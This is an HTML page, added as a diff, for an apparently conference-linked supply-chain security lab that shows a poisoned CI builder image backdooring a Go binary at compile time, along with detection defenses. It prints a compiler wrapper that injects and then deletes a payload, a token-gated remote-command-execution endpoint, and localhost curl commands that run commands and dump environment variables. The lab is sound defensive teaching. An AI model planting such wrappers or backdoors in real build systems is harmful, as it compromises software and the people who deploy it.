@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>When the Build System Betrays You — CI/CD Rootkit Lab</title>
+<meta name="description" content="A hands-on lab showing how a compromised CI builder image injects a backdoor into a binary at compile time — without ever touching the source code or git history.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0a0a0a; --bg2:#101010; --panel:#0d0d0d;
+    --ink:#e9e7df; --dim:#8c8980; --faint:#5a574f;
+    --line:#2c2a25; --line2:#46433c;
+    --amber:#ffb000; --amber-d:#3a2900;
+    --red:#ff3b30; --red-d:#3a100d;
+    --green:#5fd35f;
+    --mono:"JetBrains Mono", ui-monospace,"SF Mono",Menlo,Consolas,monospace;
+    --disp:"Space Mono", var(--mono);
+  }
+  *{box-sizing:border-box; margin:0; padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    background:var(--bg); color:var(--ink); font-family:var(--mono);
+    font-size:16px; line-height:1.6; -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; z-index:0; pointer-events:none;
+    background:repeating-linear-gradient(0deg, rgba(255,255,255,.018) 0 1px, transparent 1px 3px);
+    mix-blend-mode:overlay;
+  }
+  body::after{
+    content:""; position:fixed; inset:0; z-index:0; pointer-events:none;
+    background:radial-gradient(120% 90% at 50% 0%, transparent 55%, rgba(0,0,0,.55) 100%);
+  }
+  .wrap{position:relative; z-index:1; max-width:980px; margin:0 auto; padding:0 24px}
+
+  /* ---- TOP BAR ---- */
+  .topbar{
+    position:sticky; top:0; z-index:20; background:rgba(10,10,10,.86);
+    backdrop-filter:blur(8px); border-bottom:1px solid var(--line2);
+  }
+  .topbar .row{display:flex; align-items:center; justify-content:space-between; gap:16px; padding:12px 24px; max-width:980px; margin:0 auto}
+  .brand{display:flex; flex-direction:column; line-height:1.15}
+  .brand .k{font-size:10px; letter-spacing:.28em; color:var(--faint); text-transform:uppercase}
+  .brand .t{font-family:var(--disp); font-weight:700; font-size:14px; letter-spacing:.04em}
+  .brand .t b{color:var(--amber)}
+  .navlinks{display:flex; gap:18px; font-size:12px; letter-spacing:.08em; text-transform:uppercase}
+  .navlinks a{color:var(--dim); text-decoration:none; transition:.12s}
+  .navlinks a:hover{color:var(--amber)}
+  @media (max-width:760px){ .navlinks{display:none} }
+
+  /* ---- HERO ---- */
+  .hero{padding:88px 0 64px; border-bottom:1px solid var(--line)}
+  .eyebrow{font-size:11px; letter-spacing:.3em; color:var(--faint); text-transform:uppercase; margin-bottom:20px}
+  .hero h1{
+    font-family:var(--disp); font-weight:700; font-size:clamp(34px,7vw,68px);
+    line-height:1.02; letter-spacing:-.01em;
+    text-shadow:5px 5px 0 var(--amber-d);
+  }
+  .hero h1 b{color:var(--amber)}
+  .hero .lede{font-size:clamp(17px,2.4vw,21px); color:var(--ink); max-width:64ch; margin-top:26px}
+  .hero .lede b{color:var(--amber); font-weight:500}
+  .hero .sub{color:var(--dim); max-width:62ch; margin-top:16px; font-size:15px}
+  .cta{display:flex; gap:14px; flex-wrap:wrap; margin-top:34px}
+  .btn{
+    font-family:var(--disp); font-weight:700; font-size:14px; letter-spacing:.06em;
+    padding:14px 24px; cursor:pointer; text-transform:uppercase; text-decoration:none;
+    display:inline-flex; align-items:center; gap:10px; transition:.12s; border:1px solid var(--line2);
+  }
+  .btn.primary{background:var(--amber); color:#000; border-color:var(--amber); box-shadow:5px 5px 0 var(--amber-d)}
+  .btn.primary:hover{transform:translate(-2px,-2px); box-shadow:7px 7px 0 var(--amber-d)}
+  .btn.ghost{color:var(--ink); background:transparent}
+  .btn.ghost:hover{border-color:var(--amber); color:var(--amber)}
+
+  /* ---- SECTION ---- */
+  section{padding:62px 0; border-bottom:1px solid var(--line)}
+  .seclabel{
+    display:flex; align-items:center; gap:12px; margin-bottom:24px;
+    font-size:11px; letter-spacing:.3em; text-transform:uppercase; color:var(--dim);
+  }
+  .seclabel .no{color:var(--amber); border:1px solid var(--amber); padding:2px 9px; letter-spacing:.16em}
+  .seclabel::after{content:""; flex:1; height:1px; background:var(--line)}
+  h2{font-family:var(--disp); font-weight:700; font-size:clamp(24px,4vw,38px); line-height:1.08; letter-spacing:-.01em; margin-bottom:18px}
+  h3{font-family:var(--disp); font-weight:700; font-size:18px; margin:26px 0 12px; color:var(--ink)}
+  p{max-width:68ch; margin-bottom:16px; color:var(--ink)}
+  p.dim{color:var(--dim)}
+  .lead::before{content:"› "; color:var(--amber); font-weight:700}
+  strong{color:var(--amber); font-weight:500}
+  a.inline{color:var(--amber); text-decoration:none; border-bottom:1px solid var(--amber-d)}
+
+  /* precedents */
+  .cases{display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:14px; margin:8px 0 26px}
+  .case{border:1px solid var(--line2); border-left:4px solid var(--red); padding:16px 18px; background:rgba(255,59,48,.04)}
+  .case .yr{font-family:var(--disp); font-weight:700; color:var(--red); font-size:13px; letter-spacing:.1em}
+  .case .nm{font-weight:500; margin:6px 0 8px; font-size:15px}
+  .case .ds{color:var(--dim); font-size:13px; line-height:1.5}
+
+  /* paradox */
+  .paradox{display:grid; grid-template-columns:1fr auto 1fr; gap:0; align-items:stretch; margin:26px 0; border:1px solid var(--line2)}
+  .pcol{padding:22px 20px}
+  .pcol.clean{border-right:1px solid var(--line)}
+  .pcol .ph{font-size:10px; letter-spacing:.24em; text-transform:uppercase; margin-bottom:14px}
+  .pcol.clean .ph{color:var(--green)}
+  .pcol.bad .ph{color:var(--red)}
+  .pcol .ln{display:flex; justify-content:space-between; gap:12px; padding:7px 0; border-bottom:1px solid var(--line); font-size:13.5px}
+  .pcol .ln span:first-child{color:var(--dim)}
+  .pcol .ok{color:var(--green)} .pcol .no{color:var(--red)}
+  .pcol .hash{font-size:11px; color:var(--faint); word-break:break-all; margin-top:12px; line-height:1.5}
+  .pcol .hash b{display:block; font-size:10px; letter-spacing:.18em; text-transform:uppercase; color:var(--dim); margin-bottom:4px}
+  .pmid{display:grid; place-items:center; padding:0 18px; background:var(--bg2)}
+  .pmid span{font-family:var(--disp); font-weight:700; color:var(--amber); font-size:22px; text-align:center; line-height:1.2}
+  @media (max-width:680px){ .paradox{grid-template-columns:1fr} .pcol.clean{border-right:none; border-bottom:1px solid var(--line)} .pmid{padding:14px} }
+
+  /* steps */
+  .steps{list-style:none; counter-reset:s; max-width:74ch}
+  .steps li{counter-increment:s; display:flex; gap:16px; padding:14px 0; border-bottom:1px solid var(--line)}
+  .steps li::before{
+    content:counter(s,decimal-leading-zero); font-family:var(--disp); font-weight:700; color:var(--amber);
+    font-size:14px; flex:none; width:34px; padding-top:2px;
+  }
+  .steps li b{color:var(--ink); font-weight:500}
+  .steps li small{display:block; color:var(--dim); font-size:13px; margin-top:3px}
+
+  /* code blocks */
+  figure.code{margin:18px 0; border:1px solid var(--line2); background:#000}
+  figure.code figcaption{
+    display:flex; align-items:center; justify-content:space-between; gap:10px;
+    padding:9px 14px; border-bottom:1px solid var(--line2); background:var(--bg2);
+    font-size:12px; color:var(--dim);
+  }
+  figure.code figcaption .fn{color:var(--ink)}
+  figure.code figcaption .tag{font-size:9px; letter-spacing:.16em; text-transform:uppercase; padding:2px 7px; border:1px solid var(--line2)}
+  figure.code figcaption .tag.clean{color:var(--green); border-color:rgba(95,211,95,.4)}
+  figure.code figcaption .tag.evil{color:var(--red); border-color:rgba(255,59,48,.4)}
+  figure.code pre{overflow-x:auto; padding:16px; font-size:13px; line-height:1.6; scrollbar-width:thin}
+  figure.code pre::-webkit-scrollbar{height:8px}
+  figure.code pre::-webkit-scrollbar-thumb{background:var(--line2)}
+  figure.code code{font-family:var(--mono); color:var(--ink)}
+  .cm{color:var(--faint)} .kw{color:var(--amber)} .st{color:#9ad79a} .hl{color:var(--red); font-weight:700}
+
+  /* command list */
+  .cmds{margin-top:8px}
+  .cgroup{margin-bottom:30px}
+  .cgt{font-size:11px; letter-spacing:.24em; text-transform:uppercase; color:var(--amber); margin-bottom:12px; padding-bottom:7px; border-bottom:1px solid var(--line)}
+  .cmd{position:relative; background:#000; border:1px solid var(--line); border-left:3px solid var(--amber); padding:13px 78px 13px 14px; margin-bottom:10px}
+  .cmd .c{font-family:var(--mono); font-size:13.5px; line-height:1.5; white-space:pre-wrap; word-break:break-word}
+  .cmd .c .pr{color:var(--amber); user-select:none}
+  .cmd .n{margin-top:8px; font-size:12.5px; color:var(--dim); line-height:1.45}
+  .cmd .n::before{content:"// "; color:var(--faint)}
+  .copy{
+    position:absolute; top:10px; right:10px; background:var(--bg2); border:1px solid var(--line2);
+    color:var(--dim); font-family:var(--mono); font-size:10px; letter-spacing:.1em;
+    padding:6px 9px; cursor:pointer; text-transform:uppercase; transition:.12s;
+  }
+  .copy:hover{color:var(--ink); border-color:var(--amber)}
+  .copy.done{color:var(--green); border-color:var(--green)}
+
+  /* defenses */
+  .defs{display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:14px; margin-top:8px}
+  .def{border:1px solid var(--line2); border-top:3px solid var(--green); padding:18px 20px; background:var(--panel)}
+  .def h4{font-family:var(--disp); font-size:15px; color:var(--green); margin-bottom:8px}
+  .def p{font-size:13.5px; color:var(--dim); margin:0}
+  .def code{color:var(--amber); font-size:12.5px; word-break:break-word}
+
+  /* callout */
+  .beat{border:1px solid var(--amber); border-left-width:6px; background:rgba(255,176,0,.05); padding:18px 20px; margin:24px 0; max-width:70ch}
+  .beat .bl{font-size:10px; letter-spacing:.3em; text-transform:uppercase; color:var(--amber); margin-bottom:8px; font-weight:700}
+  .beat p{font-size:17px; margin:0}
+  .warn{border:1px solid var(--red); border-left-width:6px; background:rgba(255,59,48,.06); padding:16px 20px; margin:24px 0; max-width:70ch}
+  .warn p{font-size:14px; margin:0; color:var(--ink)}
+  .warn b{color:var(--red)}
+
+  /* questions */
+  .qlist{list-style:none; max-width:72ch}
+  .qlist li{padding:12px 0 12px 26px; border-bottom:1px solid var(--line); position:relative; color:var(--ink)}
+  .qlist li::before{content:"?"; position:absolute; left:0; color:var(--amber); font-family:var(--disp); font-weight:700}
+
+  footer{padding:50px 0 70px; text-align:center}
+  footer .cred{font-family:var(--disp); font-size:13px; letter-spacing:.14em; color:var(--dim); text-transform:uppercase}
+  footer .cred b{color:var(--amber)}
+  footer .meta{color:var(--faint); font-size:12px; margin-top:14px; line-height:1.7}
+  footer a{color:var(--dim); text-decoration:none; border-bottom:1px solid var(--line2)}
+  footer a:hover{color:var(--amber)}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="row">
+    <div class="brand">
+      <span class="k">CI/CD Supply-Chain Lab</span>
+      <span class="t">When the Build System <b>Betrays</b> You</span>
+    </div>
+    <nav class="navlinks">
+      <a href="#why">Why</a>
+      <a href="#paradox">The Paradox</a>
+      <a href="#how">How It Works</a>
+      <a href="#ci">In CI</a>
+      <a href="#run">Reproduce</a>
+      <a href="#defend">Defend</a>
+    </nav>
+  </div>
+</div>
+
+<div class="wrap">
+
+  <!-- HERO -->
+  <header class="hero">
+    <div class="eyebrow">Supply-chain attack · build-time injection · reproducible lab</div>
+    <h1>When the Build System <b>Betrays</b> You</h1>
+    <p class="lede">Attackers stopped trying to get into your code. They started targeting <b>the thing that builds your code</b>.</p>
+    <p class="sub">This is a small, self-contained lab. A clean Go web server, a clean git history, a passing security scan — and a backdoored binary at the end of the pipeline. The malicious code is never in the repository. It lives inside a trusted CI builder image and is compiled in silently at build time. It runs as a real <b>GitHub Actions</b> pipeline you can fork and watch, or locally with Docker.</p>
+    <div class="cta">
+      <a class="btn primary" href="#ci">Run it in CI ▸</a>
+      <a class="btn ghost" href="#how">See how it works</a>
+    </div>
+  </header>
+
+  <!-- WHY -->
+  <section id="why">
+    <div class="seclabel"><span class="no">01</span> Why this matters</div>
+    <h2>It already happened — three times you've heard of</h2>
+    <div class="cases">
+      <div class="case">
+        <div class="yr">2020</div>
+        <div class="nm">SolarWinds</div>
+        <div class="ds">Malware shipped to 18,000 customers. The source was clean, git was clean, review passed. The implant was injected during the build.</div>
+      </div>
+      <div class="case">
+        <div class="yr">2024</div>
+        <div class="nm">XZ Utils</div>
+        <div class="ds">Two years spent earning trust, then a backdoor slipped into the release tarball — not the source. The git tree looked fine.</div>
+      </div>
+      <div class="case">
+        <div class="yr">2025</div>
+        <div class="nm">tj-actions</div>
+        <div class="ds">One compromised reusable GitHub workflow rippled into roughly 23,000 repositories at once.</div>
+      </div>
+    </div>
+    <p class="lead">Every time, the same move: the attacker never touched the code under review. They poisoned the build — the CI runner, the builder image, the release step — the parts everyone trusts because they have always just worked.</p>
+    <p class="dim">This lab reproduces that pattern end-to-end, on your laptop, so you can see exactly where the trust breaks and exactly which defenses would have caught it.</p>
+  </section>
+
+  <!-- PARADOX -->
+  <section id="paradox">
+    <div class="seclabel"><span class="no">02</span> The paradox</div>
+    <h2>Same source. Same commit. SAST passed. Different binary.</h2>
+    <p>The lab builds the <em>exact same source tree</em> twice — once with the official <code>golang:1.22-alpine</code> image, once with a "trusted enterprise" builder image. Nothing about the input changes. The output does.</p>
+    <div class="paradox">
+      <div class="pcol clean">
+        <div class="ph">● Build A — official image</div>
+        <div class="ln"><span>Source code</span><span class="ok">identical</span></div>
+        <div class="ln"><span>Git commit</span><span class="ok">identical</span></div>
+        <div class="ln"><span>SAST scan</span><span class="ok">passed</span></div>
+        <div class="ln"><span>Hidden endpoint</span><span class="ok">none</span></div>
+        <div class="hash"><b>sha256 (clean)</b>a1b2c3… ≠ d4e5f6…</div>
+      </div>
+      <div class="pmid"><span>≠</span></div>
+      <div class="pcol bad">
+        <div class="ph">● Build B — trusted CI image</div>
+        <div class="ln"><span>Source code</span><span class="ok">identical</span></div>
+        <div class="ln"><span>Git commit</span><span class="ok">identical</span></div>
+        <div class="ln"><span>SAST scan</span><span class="ok">passed</span></div>
+        <div class="ln"><span>Hidden endpoint</span><span class="no">backdoor</span></div>
+        <div class="hash"><b>sha256 (compromised)</b>d4e5f6… ≠ a1b2c3…</div>
+      </div>
+    </div>
+    <div class="beat">
+      <div class="bl">The whole point</div>
+      <p>Something changed the output without touching the input. That is the signature of a supply-chain attack — and it is invisible to source review, git, and SAST.</p>
+    </div>
+  </section>
+
+  <!-- HOW -->
+  <section id="how">
+    <div class="seclabel"><span class="no">03</span> How the attack works</div>
+    <h2>The malicious code lives in the builder, not the repo</h2>
+    <p>The CI pipeline runs the build inside a container. That one line decides which compiler actually runs:</p>
+
+    <figure class="code">
+      <figcaption><span class="fn">.github/workflows/build.yml</span><span class="tag">CI config</span></figcaption>
+<pre><code><span class="cm"># ...</span>
+  build:
+    needs: security-scan
+    runs-on: ubuntu-latest
+    container:
+      <span class="hl">image: company/go-builder:latest</span>   <span class="cm"># ← the only line that matters</span>
+    steps:
+      - uses: actions/checkout@v4
+      - run: go build -o server .         <span class="cm"># looks completely normal</span></code></pre>
+    </figure>
+
+    <p>The application source is genuinely clean. There is nothing to find here:</p>
+    <figure class="code">
+      <figcaption><span class="fn">clean_app/main.go (excerpt)</span><span class="tag clean">in the repo · clean</span></figcaption>
+<pre><code><span class="kw">func</span> main() {
+    http.HandleFunc(<span class="st">"/health"</span>, healthHandler)
+    http.HandleFunc(<span class="st">"/api/users"</span>, usersHandler)
+    http.HandleFunc(<span class="st">"/login"</span>, loginHandler)
+    log.Fatal(http.ListenAndServe(<span class="st">":"</span>+port, <span class="kw">nil</span>))
+}
+<span class="cm">// No backdoor. No weird imports. SAST and review pass.</span></code></pre>
+    </figure>
+
+    <p>Inside the trusted builder image, the real <code>go</code> compiler is renamed to <code>go.real</code> and replaced with a wrapper. On every <code>go build</code>, the wrapper drops a payload file into the source directory, compiles, then deletes it:</p>
+    <figure class="code">
+      <figcaption><span class="fn">/usr/local/go/bin/go — inside company/go-builder:latest</span><span class="tag evil">never in the repo</span></figcaption>
+<pre><code><span class="cm">#!/bin/sh</span>
+<span class="kw">case</span> <span class="st">"$1"</span> <span class="kw">in</span>
+  build|install)
+    HOOK_DST=<span class="st">"$(pwd)/zz_metrics_init.go"</span>   <span class="cm"># boring-looking name</span>
+    <span class="hl">cp /opt/.builder/hook.go "$HOOK_DST"</span>     <span class="cm"># inject payload into the package</span>
+    /usr/local/go/bin/go.real <span class="st">"$@"</span>          <span class="cm"># real build picks up ALL .go files</span>
+    <span class="hl">rm -f "$HOOK_DST"</span>                         <span class="cm"># delete the evidence</span>
+    ;;
+  *) <span class="kw">exec</span> /usr/local/go/bin/go.real <span class="st">"$@"</span> ;;
+<span class="kw">esac</span></code></pre>
+    </figure>
+
+    <p>The payload registers a hidden, token-gated endpoint that returns <code>404</code> to anyone without the secret header — and runs arbitrary commands for anyone who has it:</p>
+    <figure class="code">
+      <figcaption><span class="fn">hook.go — the injected payload</span><span class="tag evil">never in the repo</span></figcaption>
+<pre><code><span class="kw">func</span> init() {
+    http.HandleFunc(<span class="st">"/__backdoor__"</span>, <span class="kw">func</span>(w http.ResponseWriter, r *http.Request) {
+        <span class="kw">if</span> r.Header.Get(<span class="st">"X-Backdoor-Token"</span>) != <span class="st">"secret"</span> {
+            http.NotFound(w, r); <span class="kw">return</span>   <span class="cm">// invisible without the token</span>
+        }
+        out, _ := exec.Command(<span class="st">"sh"</span>, <span class="st">"-c"</span>, r.URL.Query().Get(<span class="st">"cmd"</span>)).CombinedOutput()
+        w.Write(out)                          <span class="hl">// remote command execution</span>
+    })
+}</code></pre>
+    </figure>
+
+    <h3>The full attack chain</h3>
+    <ol class="steps">
+      <li><b>Attacker publishes or compromises <code>company/go-builder:latest</code>.</b><small>A dev laptop with push access, a compromised registry, social-engineered CI access, or a malicious insider. The tag is mutable, so "latest" quietly changes one day.</small></li>
+      <li><b>CI pulls the image by tag</b> — no digest pin, no signature check.</li>
+      <li><b>The wrapper copies <code>hook.go</code> into the source directory</b> at build time.</li>
+      <li><b>The real compiler builds <code>main.go</code> + the payload together</b> — Go compiles every <code>.go</code> file in the package.</li>
+      <li><b>The wrapper deletes the payload</b> — the source tree is pristine again.</li>
+      <li><b>The backdoored binary is uploaded as the CI artifact</b> and deployed to production.</li>
+    </ol>
+    <div class="beat">
+      <div class="bl">What humans saw</div>
+      <p>PR diff: clean. SAST: passed. Git log: clean. CI logs: <code>go build -o server .</code> Nothing in any review surface ever showed the backdoor.</p>
+    </div>
+  </section>
+
+  <!-- CI -->
+  <section id="ci">
+    <div class="seclabel"><span class="no">04</span> See it run on GitHub Actions</div>
+    <h2>The attack — and the defense — on real CI runners</h2>
+    <p>This isn't a local-only script. Fork the repo, enable Actions, and the
+      <code>supply-chain-demo</code> workflow runs the whole thing on GitHub-hosted runners
+      in three stages:</p>
+    <ol class="steps">
+      <li><b>Unit tests — source is clean.</b><small>The application's Go tests pass. There is nothing wrong in the repository.</small></li>
+      <li><b>Naive pipeline ships a backdoor.</b><small>SAST passes, the build succeeds, and it uploads a release artifact — built on GitHub's runner inside the "trusted" image, and backdoored. Download it from the run and <code>strings server | grep __backdoor__</code> to see it.</small></li>
+      <li><b>Hardened gate catches it.</b><small>An independent clean reference build plus the reproducible-build gate detect the hash mismatch and block the artifact before it could deploy.</small></li>
+    </ol>
+    <div class="beat">
+      <div class="bl">Why this matters</div>
+      <p>You watch a binary get backdoored by "clean" CI and then watch a cheap, independent check stop it — in the exact environment your own pipelines run in, not on a slide.</p>
+    </div>
+    <p class="dim">Workflow: <code>.github/workflows/supply-chain-demo.yml</code>. The victim's naive pipeline (<code>clean_app/.github/workflows/build.yml</code>) ships a commented, digest-pinned hardened fix alongside it.</p>
+  </section>
+
+  <!-- RUN -->
+  <section id="run">
+    <div class="seclabel"><span class="no">05</span> Reproduce it locally</div>
+    <h2>Prefer the terminal? Run it on your machine</h2>
+    <div class="warn">
+      <p><b>For education and authorized testing only.</b> This repo demonstrates a known attack class against build systems so you can defend against it. Run it on your own machine. Don't deploy the artifacts or point the backdoor at anything you don't own. <b>Safe by default:</b> servers bind to <code>127.0.0.1</code>, the backdoor's command execution is a dry-run unless you set <code>LAB_ALLOW_RCE=1</code>, and the token is read from the environment (not hardcoded).</p>
+    </div>
+    <p class="dim"><b>Prerequisites:</b> Docker (running) and git — every build happens inside Docker, so no local Go toolchain is needed. Works on <b>macOS and Linux</b>; the scripts auto-detect your OS and CPU. Every command below is also listed in the project README.</p>
+
+    <div class="cmds" id="cmdHost"></div>
+  </section>
+
+  <!-- DEFEND -->
+  <section id="defend">
+    <div class="seclabel"><span class="no">06</span> How to detect &amp; prevent it</div>
+    <h2>Three cheap mechanisms would each have caught this</h2>
+    <p>None of these need new tooling. They need a threat model that includes your build system — and the discipline to enforce it.</p>
+    <div class="defs">
+      <div class="def">
+        <h4>Reproducible builds</h4>
+        <p>Build the same source on an independent, known-clean toolchain and compare hashes. Same source, different binary = stop. This is what catches the attack in this lab.</p>
+      </div>
+      <div class="def">
+        <h4>SLSA L3 provenance</h4>
+        <p>Provenance generated by the build <em>platform</em>, not a script — recording the full environment, including the runner image digest. <code>company/go-builder:latest</code> resolves to a different SHA than the expected base; the attestation doesn't match.</p>
+      </div>
+      <div class="def">
+        <h4>Digest pinning</h4>
+        <p>A mutable tag changes silently. Pin to a digest — <code>golang@sha256:…</code> — and the pipeline fails the moment someone swaps the image. That failure is your review moment.</p>
+      </div>
+      <div class="def">
+        <h4>Signature verification</h4>
+        <p>Sign artifacts with keyless Sigstore at upload, verify at deploy with <code>cosign verify-blob</code>. A modified or self-hosted runner won't match the expected OIDC identity.</p>
+      </div>
+      <div class="def">
+        <h4>Scan the builders</h4>
+        <p>Don't only scan apps. <code>trivy image company/go-builder:latest</code>, plus post-build binary SCA with <code>syft</code> + <code>grype</code> on the artifact itself.</p>
+      </div>
+      <div class="def">
+        <h4>Constrain the runner</h4>
+        <p>Ephemeral runners with no persistence between jobs, and a read-only source mount so a wrapper physically cannot drop a file into your package.</p>
+      </div>
+    </div>
+
+    <p class="dim" style="margin-top:18px">This isn't theory in the repo: a real GitHub Actions workflow (<code>.github/workflows/supply-chain-demo.yml</code>) reproduces the attack on every push and then <b>fails the build</b> via the reproducible-build gate — so you can watch the defense catch it in CI, not just on a slide. The victim's naive pipeline ships the included hardened, digest-pinned fix alongside it.</p>
+
+    <div class="beat">
+      <div class="bl">The thesis</div>
+      <p>Ten years of hardening pushed attackers out of your repo. So they moved upstream — to the runners, builder images, and registry mirrors your developers trust unconditionally. The attack surface moved. Your threat model has to move with it.</p>
+    </div>
+
+    <h3>Monday-morning questions</h3>
+    <ul class="qlist">
+      <li>Who has push access to your builder images?</li>
+      <li>When did you last look inside one of them?</li>
+      <li>Do your artifact hashes match across two independent builds?</li>
+      <li>Are your CI images pinned to a digest, or to <code>latest</code>?</li>
+    </ul>
+    <p class="dim">If you can't answer those, you have the same gap this lab just exploited.</p>
+  </section>
+
+  <footer>
+    <div class="cred">CI/CD Rootkit Lab — <b>When the Build System Betrays You</b></div>
+    <div class="meta">
+      A reproducible supply-chain demonstration · for education &amp; authorized testing only<br>
+      Originally built for a BSides Porto 2026 talk · <a href="https://slsa.dev" target="_blank" rel="noopener">slsa.dev</a> · <a href="https://www.sigstore.dev" target="_blank" rel="noopener">sigstore.dev</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+/* ====== Commands (mirrors the project README) ====== */
+const COMMANDS = [
+  { g:"Setup (one time)", items:[
+    {c:"bash setup.sh", n:"Builds the poisoned runner image, inits git, and builds both binaries — all inside Docker."},
+    {c:"docker images | grep go-builder", n:"Confirm the builder image exists: company/go-builder:latest."},
+    {c:"shasum -a 256 build_clean/server build_compromised/server", n:"The two hashes MUST differ — same source, different binary."}
+  ]},
+  { g:"Run the demo", items:[
+    {c:"bash demo_compare.sh", n:"Full guided demo — source review, CI view, hash paradox, live servers, the reveal, and defenses."},
+    {c:"bash demo_reveal_runner.sh", n:"Reveal the wrapper and payload hidden inside the trusted builder image."},
+    {c:"bash demo_provenance_fail.sh", n:"Show how reproducible builds, SLSA L3, and cosign each flag the attack."},
+    {c:"bash demo_clean.sh", n:"Run only the clean server on port 8080."},
+    {c:"bash demo_compromised.sh", n:"Run only the backdoored server on port 8081."}
+  ]},
+  { g:"Trigger the backdoor (servers running)", items:[
+    {c:"curl http://localhost:8080/__backdoor__", n:"Clean server → 404. The endpoint does not exist."},
+    {c:"curl -H 'X-Backdoor-Token: secret' http://localhost:8081/__backdoor__", n:"Compromised server → backdoor_active JSON."},
+    {c:"curl -H 'X-Backdoor-Token: secret' 'http://localhost:8081/__backdoor__?cmd=id'", n:"Remote command execution. The guided demos enable this (LAB_ALLOW_RCE=1); otherwise it returns a safe dry-run."},
+    {c:"curl -H 'X-Backdoor-Token: secret' 'http://localhost:8081/__backdoor__?cmd=env'", n:"Dumps env — the credential-exfiltration simulation (with RCE enabled)."},
+    {c:"strings build_compromised/server | grep -i backdoor", n:"Present in the compromised binary."},
+    {c:"strings build_clean/server | grep -i backdoor", n:"Absent from the clean binary."}
+  ]},
+  { g:"Test & verify", items:[
+    {c:"docker run --rm -v \"$PWD/clean_app\":/app -w /app golang:1.22-alpine go test ./...", n:"Unit tests — the application source is clean (no local Go needed)."},
+    {c:"bash tests/run_tests.sh", n:"End-to-end integration tests for every invariant of the lab."},
+    {c:"bash verify_reproducible.sh build_clean/server build_compromised/server", n:"The reproducible-build gate — exits non-zero on a tampered artifact. Wire it into any deploy pipeline."}
+  ]},
+  { g:"Rebuild / reset", items:[
+    {c:"bash compromised_runner/build_and_inject.sh", n:"Rebuild only the compromised binary — fast, no sudo."},
+    {c:"docker build -t company/go-builder:latest -f compromised_runner/Dockerfile.builder compromised_runner/", n:"Rebuild only the poisoned runner image."}
+  ]},
+  { g:"Break-glass fixes", items:[
+    {c:"open -a Docker", n:"Start Docker Desktop, then wait ~30s."},
+    {c:"lsof -ti:8080 | xargs kill", n:"Free port 8080."},
+    {c:"lsof -ti:8081 | xargs kill", n:"Free port 8081."}
+  ]}
+];
+
+function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
+
+function renderCommands(){
+  let h = "";
+  COMMANDS.forEach(grp=>{
+    h += `<div class="cgroup"><div class="cgt">${grp.g}</div>`;
+    grp.items.forEach(it=>{
+      h += `<div class="cmd"><button class="copy" data-cmd="${esc(it.c)}">Copy</button><div class="c"><span class="pr">$ </span>${esc(it.c)}</div>${it.n?`<div class="n">${esc(it.n)}</div>`:""}</div>`;
+    });
+    h += `</div>`;
+  });
+  document.getElementById("cmdHost").innerHTML = h;
+  document.querySelectorAll(".copy").forEach(b=>{
+    b.addEventListener("click", ()=> copy(b.dataset.cmd, b));
+  });
+}
+
+function copy(text, btn){
+  const done = ()=>{ btn.textContent="Copied"; btn.classList.add("done"); setTimeout(()=>{btn.textContent="Copy"; btn.classList.remove("done")},1200); };
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(done).catch(()=>fallback(text,done));
+  } else fallback(text,done);
+}
+function fallback(text, done){
+  const ta=document.createElement("textarea"); ta.value=text; ta.style.position="fixed"; ta.style.opacity="0";
+  document.body.appendChild(ta); ta.select();
+  try{ document.execCommand("copy"); done(); }catch(e){}
+  document.body.removeChild(ta);
+}
+
+renderCommands();
+</script>
+</body>
+</html>
